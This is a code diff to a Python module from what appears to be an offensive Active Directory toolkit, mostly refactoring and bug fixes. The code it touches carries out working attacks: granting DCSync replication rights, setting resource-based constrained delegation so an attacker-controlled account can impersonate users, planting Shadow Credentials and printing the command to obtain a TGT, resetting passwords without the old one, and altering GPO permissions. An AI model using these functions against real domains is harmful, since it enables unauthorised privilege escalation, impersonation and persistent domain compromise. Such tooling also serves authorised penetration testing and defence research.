@@ -1,7 +1,8 @@
-import logging
+import ldap3
+import random
+import string
 from functools import wraps
 
-import ldap3, impacket, random, string
 from ldap3.extend.microsoft import addMembersToGroups, modifyPassword, removeMembersFromGroups
 from dsinternals.system.Guid import Guid
 from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
@@ -9,15 +10,13 @@ from dsinternals.system.DateTime import DateTime
 from dsinternals.common.data.hello.KeyCredential import KeyCredential
 from impacket.ldap import ldaptypes
 
-from .exceptions import ResultError, NoResultError, TooManyResultsError
+from .exceptions import ResultError, NoResultError
 from .utils import createACE, createEmptySD
 from .utils import resolvDN, getDefaultNamingContext
 from .utils import rpcChangePassword
 from .utils import userAccountControl
+from .utils import LOG
 
-
-LOG = logging.getLogger()
-logging.basicConfig(level=logging.DEBUG, format='%(message)s')
 
 modules = []
 
@@ -63,27 +62,24 @@ def addUser(conn, sAMAccountName, password, ou=None):
     """
     ldap_conn = conn.getLdapConnection()
 
-    # TODO: Check that the user is not already present in AD?
-    #user_dn = resolvDN(conn, sAMAccountName)
-    #print(user_dn)
-
     if ou:
         user_dn = f"cn={sAMAccountName},{ou}"
     else:
         naming_context = getDefaultNamingContext(ldap_conn)
         user_dn = f"cn={sAMAccountName},cn=Users,{naming_context}"
 
-    LOG.debug(user_dn)
     user_cls = ['top', 'person', 'organizationalPerson', 'user']
-    attr = {'objectClass':  user_cls}
+    attr = {'objectClass': user_cls}
     attr["distinguishedName"] = user_dn
     attr["sAMAccountName"] = sAMAccountName
     attr["userAccountControl"] = 544
 
     ldap_conn.add(user_dn, attributes=attr)
-    LOG.info(ldap_conn.result)
 
-    changePassword(conn, sAMAccountName, password)
+    if ldap_conn.result['description'] == 'success':
+        changePassword(conn, sAMAccountName, password)
+    else:
+        LOG.error(sAMAccountName + ': ' + ldap_conn.result['description'])
 
 
 @register_module
@@ -172,7 +168,7 @@ def delUserFromGroup(conn, member, group):
 def addForeignObjectToGroup(conn, user_sid, group_dn):
     """
     Add foreign principals (users or groups), coming from a trusted domain, to a group
-    Args: 
+    Args:
         foreign object sid
         group dn in which to add the foreign object
     """
@@ -195,7 +191,6 @@ def addDomainSync(conn, identity):
     ldap_conn.search(user_dn, '(objectClass=*)', attributes=['objectSid'])
     user_sid = ldap_conn.entries[0]['objectSid'].raw_values[0]
 
-
     # Set SD flags to only query for DACL
     controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
 
@@ -216,13 +211,14 @@ def addDomainSync(conn, identity):
 
     dn = entry.entry_dn
     data = secDesc.getData()
-    ldap_conn.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
+    ldap_conn.modify(dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
+
 
 @register_module
 def changePassword(conn, identity, new_pass):
     """
     Change the target password without knowing the old one using LDAPS
-    Args: 
+    Args:
         sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
         new password for the target
     """
@@ -239,7 +235,7 @@ def changePassword(conn, identity, new_pass):
     else:
         # Check if identity is sAMAccountName
         sAMAccountName = identity
-        for marker in ["dn=","s-1","{"]:
+        for marker in ["dn=", "s-1", "{"]:
             if marker in identity:
                 ldap_filter = '(objectClass=*)'
                 entries = ldap_conn.search(target_dn, ldap_filter, attributes=['SAMAccountName'])
@@ -250,6 +246,7 @@ def changePassword(conn, identity, new_pass):
                 break
 
         rpcChangePassword(conn, sAMAccountName, new_pass)
+
 
 @register_module
 def addComputer(conn, hostname, password, ou=None):
@@ -270,14 +267,12 @@ def addComputer(conn, hostname, password, ou=None):
         computer_dn = f'cn={sAMAccountName},cn=Computers,{naming_context}'
 
     computer_cls = ['top', 'person', 'organizationalPerson', 'user', 'computer']
-    computer_spns = [
-            f'HOST/{hostname}',
-            f'HOST/{hostname}.{domain}',
-            f'RestrictedKrbHost/{hostname}',
-            f'RestrictedKrbHost/{hostname}.{domain}',
-            ]
-    attr = {
-            'objectClass':  computer_cls,
+    computer_spns = [f'HOST/{hostname}',
+                     f'HOST/{hostname}.{domain}',
+                     f'RestrictedKrbHost/{hostname}',
+                     f'RestrictedKrbHost/{hostname}.{domain}',
+                     ]
+    attr = {'objectClass': computer_cls,
             'distinguishedName': computer_dn,
             'sAMAccountName': sAMAccountName,
             'userAccountControl': 0x1000,
@@ -295,7 +290,7 @@ def addComputer(conn, hostname, password, ou=None):
 def setRbcd(conn, spn_sid, target_identity):
     """
     Give Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
-    Args: 
+    Args:
         object sid of the SPN (Controlled by you)
         sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
     """
@@ -308,7 +303,7 @@ def setRbcd(conn, spn_sid, target_identity):
     except IndexError:
         LOG.error('User not found in LDAP: %s' % spn_sid)
 
-    ldap_conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
+    ldap_conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
     targetuser = None
     for entry in ldap_conn.response:
         if entry['type'] != 'searchResEntry':
@@ -326,10 +321,10 @@ def setRbcd(conn, spn_sid, target_identity):
         # Create DACL manually
         sd = createEmptySD()
     sd['Dacl'].aces.append(createACE(spn_sid))
-    ldap_conn.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
+    ldap_conn.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})
     if ldap_conn.result['result'] == 0:
         LOG.info('Delegation rights modified succesfully!')
-        LOG.info('%s can now impersonate users on %s via S4U2Proxy', ldaptypes.LDAP_SID(spn_sid).formatCanonical(), target)
+        LOG.info('%s can now impersonate users on %s via S4U2Proxy', ldaptypes.LDAP_SID(spn_sid).formatCanonical(), target_identity)
     else:
         raise ResultError(ldap_conn.result)
 
@@ -338,15 +333,15 @@ def setRbcd(conn, spn_sid, target_identity):
 def setShadowCredentials(conn, identity, outfilePath=None):
     """
     Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
-    Args: 
+    Args:
         identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
         outfilePath: file path for the generated certificate (default is current path)
     """
     ldap_conn = conn.getLdapConnection()
 
-    target_dn = resolvDN(ldap_conn, sAMAccountName)
+    target_dn = resolvDN(ldap_conn, identity)
     LOG.debug("Generating certificate")
-    certificate = X509Certificate2(subject=sAMAccountName, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
+    certificate = X509Certificate2(subject=identity, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
     LOG.debug("Certificate generated")
     LOG.debug("Generating KeyCredential")
     keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
@@ -364,7 +359,7 @@ def setShadowCredentials(conn, identity, outfilePath=None):
     try:
         new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
         LOG.debug(new_values)
-        LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % sAMAccountName)
+        LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % identity)
         conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
         if ldap_conn.result['result'] == 0:
             LOG.debug("Updated the msDS-KeyCredentialLink attribute of the target object")
@@ -379,7 +374,7 @@ def setShadowCredentials(conn, identity, outfilePath=None):
             LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
             LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
             LOG.info("Run the following command to obtain a TGT")
-            LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', sAMAccountName, path))
+            LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', identity, path))
         else:
             raise ResultError(ldap_conn.result)
     except IndexError:
@@ -409,7 +404,7 @@ def setAccountDisableFlag(conn, identity, enable):
     You must have write permission on the UserAccountControl attribute of the target
     Args:
         sAMAccountName, DN, GUID or SID of the target
-        set the flag on the UserAccountControl attribute 
+        set the flag on the UserAccountControl attribute
     """
     ldap_conn = conn.getLdapConnection()
 
@@ -445,7 +440,7 @@ def modifyGpoACE(conn, identity, gpo):
     secDesc['Dacl']['Data'].append(newace)
     data = secDesc.getData()
 
-    ldap_conn.modify(gpo.entry_dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
+    ldap_conn.modify(gpo.entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
     if ldap_conn.result["result"] == 0:
         LOG.info('LDAP server claims to have taken the secdescriptor. Have fun')
     else:
